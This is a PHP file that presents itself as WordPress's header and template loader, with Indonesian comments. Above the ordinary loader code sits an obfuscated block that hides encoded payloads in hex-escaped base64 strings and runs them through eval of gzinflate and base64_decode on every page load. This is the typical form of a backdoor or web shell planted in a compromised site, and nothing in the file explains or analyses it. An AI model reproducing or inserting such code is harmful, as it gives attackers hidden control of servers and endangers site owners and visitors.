<?php
$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
$Lix = "\x3d\x3dghHh3JtDU\x43RpiOpR\x2bOzsI5ft/6foXVz9v8N\x61r\x62QY1WeH0rOLK4DN8nwUoKuNEl7Rg\x63Y5hMPkTKJyJEhr3q\x43KL7oD/\x41DeIyDNKx0\x62\x43\x6327tNxVoSz\x41IxY\x62mZne\x421P\x61hF\x62nP4x8N23x6EDiWJW2oh88\x2bxTJ1U\x63lQ8dDOtV\x41L6ZU6ELry\x42dy\x4138fJRTSWt3u\x62v\x619nF2Wn\x61LSOr\x43Hxg\x2bfdPhRdl8SjhmhUshwDHZnyV8f\x61xGwW\x43MdLOTF\x43VNzsUlW1\x63LhEVe\x423Vh\x61edRW\x61ZytpOvT33FJn\x63Tni8Ppp73O1\x2b7h0yj\x63orpYpgfM\x2bgq2VFeiIUetmDh\x43os\x43LNqe\x43\x43OxP\x2bDggp3YevofmhikNrifVo1dTDzyrGQrWesyd\x62ljWeGEHDp/qe\x63hsl\x63yzVQiZGZG\x2brnh9UVE\x43TgTHqVs\x2bKMLKJq\x63\x41XyVJh5YYHq\x61R9pQUUZJpz5665mhNLsdEEWXX3n87WXL/lp44j81d\x62\x4130wtw9M2XG9EE/k/1sNF/19\x613eI7HWqILdIDZgT/n9u4PuMPr8y4ng5STX/hMSTQnH9ZXTyvG1\x2b6Qf3u\x63ydlyvxoXJoNoP\x43\x62VqTiv8\x61E7\x42f\x2bhj1lynlVJRt\x43MUOtLn\x435d466DiWMzFM6YRU\x63H1\x42fRF\x2bdoKFrxlzldL5tz570j/l\x42Lp3\x43T\x2b89rz360F3lHRR\x2b/g3EfUh5lW\x61\x42QXzPkV\x41g3wUg\x42NqyU4SoPtT9QnSqVYoRPG6QsMYDkSe\x6175JlTRjS6Ggven\x43R0/Tnzv7yefPxSXZL\x2bwg\x43PluL7/fdS7JJ9\x61SVW\x623yspIEqPUYimqNVQp\x41uurUhZPUQikkhExw/nmP9D\x42M\x62/07U1\x62/iKQX\x42wJe9fp\x41oFQ/SKQ\x62\x42wJe9fo\x414FQ/\x43KQf\x42wJe9fn\x41IGQ/yJQj\x42wJe";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
?>
<?php
/**
 * Memuat lingkungan WordPress dan template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

    // Cegah pemuatan ulang jika sudah dimuat sebelumnya
    $wp_did_header = true;

    // Memuat file WordPress
    require_once __DIR__ . '/wp-load.php';

    // Menyiapkan query WordPress
    wp();

    // Memuat template dari WordPress
    require_once ABSPATH . WPINC . '/template-loader.php';
}
?>
